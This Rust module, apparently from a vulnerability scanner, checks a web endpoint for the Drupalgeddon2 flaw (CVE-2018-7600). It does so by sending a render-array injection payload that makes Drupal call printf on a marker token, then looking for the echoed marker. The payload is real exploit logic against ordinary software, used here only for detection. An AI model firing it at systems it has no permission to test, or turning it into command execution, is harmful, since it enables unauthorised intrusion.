use super::{HttpFinding, HttpModule};
use crate::{modules::Module, Result};
use async_trait::async_trait;
use lazy_regex::regex;
use reqwest::Client;
use tracing::{debug, info, instrument};

// region:        --- Module info

pub struct Cve2018_7600 {}

impl Cve2018_7600 {
    pub fn new() -> Self {
        Self {}
    }
}

impl Module for Cve2018_7600 {
    fn name(&self) -> String {
        "http/cve_2018_7600".to_string()
    }
    fn description(&self) -> String {
        "Check for CVE-2018-7600 (a.k.a. Drupalgeddon2)".to_string()
    }
}

// endregion:     --- Module info

#[async_trait]
impl HttpModule for Cve2018_7600 {
    #[instrument(name = "check", level = "info", fields(module = self.name()), skip_all)]
    async fn scan(&self, http_client: &Client, endpoint: &str) -> Result<Option<HttpFinding>> {
        // prepare post request
        let token = "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314";
        let form = [
            ("form_id", "user_pass"),
            ("_triggering_element_name", "name"),
        ];
        let query_params = [
            ("name[#type]", "markup"),
            ("name[#markup]", &token),
            ("name[#post_render][]", "printf"),
            ("q", "user/password"),
        ];

        // send request
        let url = format!("{}/", &endpoint);
        info!("{:12} - {:?}", "HTTP REQUEST POST", &url);
        let res = http_client
            .post(&url)
            .query(&query_params)
            .form(&form)
            .send()
            .await?;
        debug!("POST RESPONSE: {:?}", res);

        if !res.status().is_success() {
            return Ok(None);
        }

        let body = res.text().await?;
        let form_regex = regex!(r#"<input type="hidden" name="form_build_id" value="([^"]+)" />"#);

        if let Some(matchs) = form_regex.captures(&body) {
            if matchs.len() > 1 {
                let form_id = &matchs[1];

                let form = [("form_build_id", form_id)];
                let query_params = [("q", format!("file/ajax/name/#value/{}", form_id))];
                let res = http_client
                    .post(&url)
                    .query(&query_params)
                    .form(&form)
                    .send()
                    .await?;

                let body = res.text().await?;

                if body.contains(&token) {
                    return Ok(Some(HttpFinding::Cve2018_7600(url)));
                }
            }
        }

        Ok(None)
    }
}
